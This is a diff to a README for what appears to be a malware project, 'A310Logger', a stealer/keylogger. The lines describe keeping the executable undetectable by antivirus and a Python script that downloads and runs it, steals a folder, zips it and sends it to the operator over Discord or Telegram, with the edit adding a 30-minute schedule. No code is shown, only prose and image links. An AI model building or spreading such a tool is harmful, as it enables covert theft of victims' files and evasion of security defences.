@@ -51,8 +51,10 @@ To escape antivirus detection and always stay fud , the executable A310Logger.ex
     ![c](https://user-images.githubusercontent.com/30985149/107445106-c6c45280-6b76-11eb-8f2f-f27b4a7ebfd6.PNG)
 
     
-* Now a second script written in python allows to download and run A310Logger.exe 
- finally it will steal the folder and zip all after send you by discord or telegram ..etc
+* Now a second script written in python allows to :
+
+      download and run A310Logger.exe 
+ finally it will steal the folder and zip all after send you by discord or telegram ..etc every 30 minutes
  
  ![d](https://user-images.githubusercontent.com/30985149/107445070-b613dc80-6b76-11eb-83df-90641b155774.png)
 
